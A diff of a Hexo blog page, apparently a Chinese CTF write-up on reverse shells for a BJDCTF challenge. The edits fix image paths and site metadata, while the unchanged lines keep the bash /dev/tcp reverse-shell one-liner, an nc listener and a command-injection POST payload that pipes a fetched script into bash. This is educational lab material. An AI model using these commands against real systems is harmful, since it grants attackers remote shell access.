@@ -87,11 +87,10 @@
 <meta property="og:description" content="从BJDCTF中的一道题来引入反弹shell这个知识点，因为本人过菜之前不知道还有这个知识，今天有空就写一下知识点，记录下该题。 1、前提知识：bash反弹shell1bash -i &amp;gt;&amp;amp; &amp;#x2F;dev&amp;#x2F;tcp&amp;#x2F;192.168.20.151&amp;#x2F;8080 0&amp;gt;&amp;amp;1  bash一句话命令详解以下针对常用的bash反弹一句话进行了拆分说明，具">
 <meta property="og:locale" content="en">
 <meta property="og:image" content="https:&#x2F;&#x2F;imgconvert.csdnimg.cn&#x2F;aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy85MTEzOTgxLTQ4OTdlODU4NmExZWJlYjQucG5n">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;04&#x2F;07&#x2F;%E5%8F%8D%E5%BC%B9shell&#x2F;F:%5Cblog%5Chexo%5Csource_posts%5C%E5%8F%8D%E5%BC%B9shell%5C1586258681040.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;04&#x2F;07&#x2F;%E5%8F%8D%E5%BC%B9shell&#x2F;C:%5CUsers%5C10173%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1586257288904.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;04&#x2F;07&#x2F;%E5%8F%8D%E5%BC%B9shell&#x2F;C:%5CUsers%5C10173%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1586258736780.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;04&#x2F;07&#x2F;%E5%8F%8D%E5%BC%B9shell&#x2F;C:%5CUsers%5C10173%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1586258801638.png">
-<meta property="og:updated_time" content="2020-04-07T15:14:26.958Z">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;04&#x2F;07&#x2F;%E5%8F%8D%E5%BC%B9shell&#x2F;1586258681040.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;04&#x2F;07&#x2F;%E5%8F%8D%E5%BC%B9shell&#x2F;1586258736780.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;04&#x2F;07&#x2F;%E5%8F%8D%E5%BC%B9shell&#x2F;1586258801638.png">
+<meta property="og:updated_time" content="2020-04-08T12:15:19.086Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https:&#x2F;&#x2F;imgconvert.csdnimg.cn&#x2F;aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy85MTEzOTgxLTQ4OTdlODU4NmExZWJlYjQucG5n">
 
@@ -319,18 +318,17 @@
 <p>之后便在kali下用ssh连接</p>
 <p>ssh -p 27705 <a href="mailto:root@911-cc1913a9-f68f-44ea-a069-e4e678dfdcd7node3.buuoj.cn" target="_blank" rel="noopener">root@911-cc1913a9-f68f-44ea-a069-e4e678dfdcd7node3.buuoj.cn</a></p>
 <p>之后先用ifconfig查询ip</p>
-<p><img src="/2020/04/07/%E5%8F%8D%E5%BC%B9shell/F:%5Cblog%5Chexo%5Csource_posts%5C%E5%8F%8D%E5%BC%B9shell%5C1586258681040.png" alt="1586258681040"></p>
-<p><img src="/2020/04/07/%E5%8F%8D%E5%BC%B9shell/C:%5CUsers%5C10173%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1586257288904.png" alt="1586257288904"></p>
+<p><img src="/2020/04/07/%E5%8F%8D%E5%BC%B9shell/1586258681040.png" alt="1586258681040"></p>
 <p>174.1.227.134</p>
 <p>之后在/var/www/html中创建一个shell.txt</p>
 <p>写入bash -i &gt;&amp; /dev/tcp/174.1.227.114/23333 0&gt;&amp;1</p>
 <p>再用nc -lvp 23333去监听这个端口</p>
 <p>然后回到之前的页面post发送girl_friend=curl <a href="http://174.1.227.134/shell.txt|bash" target="_blank" rel="noopener">http://174.1.227.134/shell.txt|bash</a></p>
 <p>去反弹shell</p>
-<p><img src="/2020/04/07/%E5%8F%8D%E5%BC%B9shell/C:%5CUsers%5C10173%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1586258736780.png" alt="1586258736780"></p>
+<p><img src="/2020/04/07/%E5%8F%8D%E5%BC%B9shell/1586258736780.png" alt="1586258736780"></p>
 <p>直接cat /flag发现flag是假的，则用find / -name flag来查询flag</p>
 <p>最终得到flag</p>
-<p><img src="/2020/04/07/%E5%8F%8D%E5%BC%B9shell/C:%5CUsers%5C10173%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1586258801638.png" alt="1586258801638"></p>
+<p><img src="/2020/04/07/%E5%8F%8D%E5%BC%B9shell/1586258801638.png" alt="1586258801638"></p>
 <p>详细原理可看大佬文章：</p>
 <p>Linux反弹shell（一）文件描述符与重定向 <a href="https://xz.aliyun.com/t/2548" target="_blank" rel="noopener">https://xz.aliyun.com/t/2548</a></p>
 <p>Linux 反弹shell（二）反弹shell的本质 <a href="https://xz.aliyun.com/t/2549" target="_blank" rel="noopener">https://xz.aliyun.com/t/2549</a></p>
@@ -355,22 +353,6 @@
       
       
 
-      
-        <div class="post-nav">
-          <div class="post-nav-next post-nav-item">
-            
-          </div>
-
-          <span class="post-nav-divider"></span>
-
-          <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2020/04/08/%E6%96%B0%E7%9A%84%E6%B5%8B%E8%AF%95/" rel="prev" title="新的测试">
-                新的测试 <i class="fa fa-chevron-right"></i>
-              </a>
-            
-          </div>
-        </div>
       
 
       
@@ -444,7 +426,7 @@
               
                 <a href="/archives/%7C%7C%20archive">
               
-                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-count">1</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
